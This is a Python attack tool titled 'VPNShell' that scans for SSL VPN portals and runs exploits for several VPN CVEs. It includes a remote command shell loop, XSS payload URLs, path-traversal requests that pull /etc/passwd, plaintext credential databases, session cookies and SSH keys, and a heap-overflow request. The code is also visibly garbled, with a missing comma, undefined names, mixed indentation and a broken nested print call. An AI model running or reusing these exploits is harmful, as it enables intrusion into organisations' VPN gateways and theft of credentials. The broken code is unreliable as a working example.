import requests
import sys
import argparse

if sys.version_info < (3, 0):
    input = raw_input

requests.packages.urllib3.disable_warnings()


cvelist = ['CVE-2019-1579', 'CVE-2018-13380', 'CVE-2018-13381'
	  'CVE-2018-13379', 'CVE-2019-11507', 'CVE-2019-11510']
# Updating this list ...
vpnsub = ['vpn', 'covpn', 'tcovpn',
          'panvpn', 'vpn-blr', 'vpn-blr1',
          'vpn-west', 'vpn-east', 'vpn-sin',
          'vpn-cai', 'westvpn', 'eastvpn',
          'myvpn', 'privatevpn', 'pulsevpn',
          'palovpn']
red = '\033[1;31m'
white = '\033[1;m'
blue = '\033[1;34m'
green = '\033[1;32m'
if sys.platform == 'win32':
    white = red = white = blue = green = ''



banner = '''%s
 .__          .  ..__ .  .
 [__).    ,._ \  /[__)|\ |
 |    \/\/ [ ) \/ |   | \|
                           V_1.0

%s''' % (blue, white)


parser = argparse.ArgumentParser(description='VPNShell 1.0: Pwn shell from SSL VPN service (portal)')
parser.add_argument('-s', help='local sorce address (or domain)', dest='host', default='')
parser.add_argument('-p', help='local port number (default: 443)', dest='port', default='')
parser.add_argument('-c', help='command to execute after got shell', dest='command', default='')
parser.add_argument('-n', help='scan the SSL VPN service', dest='scn', action='store_true')
parser.add_argument('-l', help='list of SSL VPN vulnerabilities', dest='lst', action='store_true')
parser.add_argument('-e', help='exploit 0day vulnerability', dest='cve', default='')

args = parser.parse_args()


cmd = format(args.command)
port = args.port
try:
    if len(str(port)):
        port = ':' + int(format(args.port))
except:
    print('Invalid port %s' % port)
    quit()
lst = args.lst
scn = args.scn
cve = args.cve
host = args.host

if not len(host) and lst == False:
    print('No host to pwn.')
    quit()

    
    
def printable_char(s):
	return all((ord(c) < 127) and (ord(c) >= 32) for c in s)

def printable(b):
    if printable_char(b):
        return byte
    else:
        return '.'
    
    

def cve_2019_1579(host, port):
    sign = '<msg>Invalid parameters</msg>'
    
    url = "https://%s%s/sslmgr" % (host, port)

    data = "scep-profile-name=whoami"
    wh = requests.post(url, data=data, verify=False).text.replace('\n', '')
    if not sign in wh and len(wh) < 50:
        print('Pwned shell from %s to %s' % (host, socket.gethostbyname()))
        print('')
        print('    - - - - - - - - -')
    else:
        print('The host %s is not vulnerable to CVE-2019-1579' % host)

    data = "scep-profile-name=cd"
    t = requests.post(url, data=data, verify=False).text.replace('\n', '')
    o = 'unix'
    if len(t) > 10:
        o = 'win'

    if o == 'win':
        data = "scep-profile-name=ver"
        r = requests.post(url, data=data, verify=False).text.replace('\n', '')
        crlf = '\n'
        print(r)
        print('(c) Microsoft Corporation. All rights reserved.')
        print('')
    else:
        data = "scep-profile-name=hostname"
        hostname = requests.post(url, data=data, verify=False).text.replace('\n', '')
        crlf = ''
        if wh == 'root':
            priv = '#'
        else:
            priv = '$'

    while 1:
        if o == 'win':
            data = "scep-profile-name=cd"
            d = requests.post(url, data=data, verify=False).text.replace('\n', '')
            i = '%s>' % d
        else:
            data = "scep-profile-name=pwd"
            d = requests.post(url, data=data, verify=False).text.replace('\n', '')
            if '/home/%s' % wh in d:
                pth = d.replace('/home/%s' % wh, '~')
            i = '%s%s@%s%s:%s%s%s%s ' % (green, wh, hostname, white, blue, pth, white, priv)

        buff = input(i)
        data = "scep-profile-name=%s" % buff
        r = requests.post(url, data=data, verify=False).text.replace('\n', '')
        print(r + crlf)
        
        
        
def cve_2018_13380(host, port):
    url1 = 'https://%s%s/remote/error?errmsg=ABABAB--\%3E\%3Cscript\%3Ealert(1)\%3C/script\%3E' % (host, port)
    url2 = 'https://%s%s/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29' % (host, port)
    url3 = 'https://%s%s/message?title=x&msg=%26%23<svg/onload=alert(1)>;' % (host, port)
    
    print('Got XSS payloads for %s: ' % host)
    print(' - %s' % red + url1)
    print(' - %s' % red + url2)
    print(' - %s' % red + url3)
    

    
def cve_2018_13379(host, port):
    url = 'https://%s%s/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession' % (host, port)
    r = requests.get(url, verify=False, stream=True, timeout=3)
    img = r.raw.read()
    
    if "var fgt_lang =" in str(img) and r.status_code == 200:
        memory_addr = 0
        rb = b''
        _str = ''        
    	while True:
       	    chunk = img.read(8192)
            if chunk:
                for b in chunk:
                    rb += b     			
            else:
          	break
                
        print('Dumped the memory buffer of %s:' % host)               
        for byte in rb:
            _str += printable(byte)
            if memory_addr%61 == 60:
                if _str != '.............................................................':
                    print(_str)
                _str = ''
             
            memory_addr += 1
         
    else:
        print('The host %s is not vulnerable to CVE-2018-13379' % host)
        

	
def cve_2018_13381(host, port):
    data = {
	   'title': 'x', 
           'msg': '&#' + '<'*(0x20000) + ';<', 
    }
    r = requests.post('https://%s%s/message' % (host, port), data=data)
    print('Heaped overflow the host %s' % host)
	
	
	
def cve_2019_11507(host, port):
    url = 'https://%s%s/dana/home/cts_get_ica.cgi?bm_id=x&vdi=1&appname=aa\%0d\%0aContent-Type::text/html\%0d\%0aContent-Disposition::inline\%0d\%0aaa:bb<svg/onload=alert(document.domain)>' % (host, port)
    print('Got the XSS payload for %s:' % host)
    print(' - %s' % red + url)
	
	
	
def cve_2019_11510(host, port):
    url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/' % (host, port)
    r = requests.get(url, verify=False).text
	
    if 'root' in r:
	print('Extracted the server database from %s' % host)
	print('')
	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/' % (host, port)
	r = requests.get(url, verify=False).text
	if len(r) > 5:
	    print('Plaintext usernames and password:')
	    for l in r.split('\n'):
		print(' - ' + l)
	else:
	    print('Plaintext usernames and password: Not found')
	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/' % (host, port)
	r = requests.get(url, verify=False).text.replace('\n', '')
	print('Session cookies (sessionids): DSID=%s' % r)
	url = 'https://%s%s/dana-na/../dana/html5acc/guacamole/../../../../../../../.ssh/authorized_keys?/dana/html5acc/guacamole/' % (host, port)
        ssh = requests.get(url, verify=False).text
	if len(ssh) > 50:
	    print('  SSH PRIVATE RSA KEYS')
    	    print('')
    	    print(' - - - - - - - - - - - - - - - ')
	    print(ssh)
	    print(' - - - - - - - - - - - - - - - ')
	else:
	    print(print('  SSH PRIVATE RSA KEYS')
    	    print('')
    	    print(' - - - - - - - - - - - - - - - ')
            print(' Not found')
            print(' - - - - - - - - - - - - - - - ')
	
    else:
	print('The host %s is not vulnerable to CVE-2018-13379' % host)
	
	
	
def scan(host):
    found = False
    for sub in vpnsub:
        url = 'https://%s.%s' % (sub, host)
        try:
            r = requests.get(url, verify=False, timeout=3)
            print('Found a SSL VPN service: %s%s%s' % (red, url.replace('https://', ''), white))
            found = True
        except:
            pass


print(banner)

if lst == True:
    print('List of SSL VPN 0day vulnerabilities in the database:')
    for x in cvelist:
        print(' - ' + x)
    print('')
    quit()
elif scn == True:
    print('Scanning for any %s SSL VPN service ...' % host)
    if scan(host) == False:
        print("Can't found any SSL VPN service for %s" % host)
    print('')
    quit()

if not cve.upper() in cvelist:
    print('No 0day exploit found for %s' % cve)
    quit()
else:
    exec('%s(host, port)' % cve.lower().replace('-', '_'))

print('')
    
    

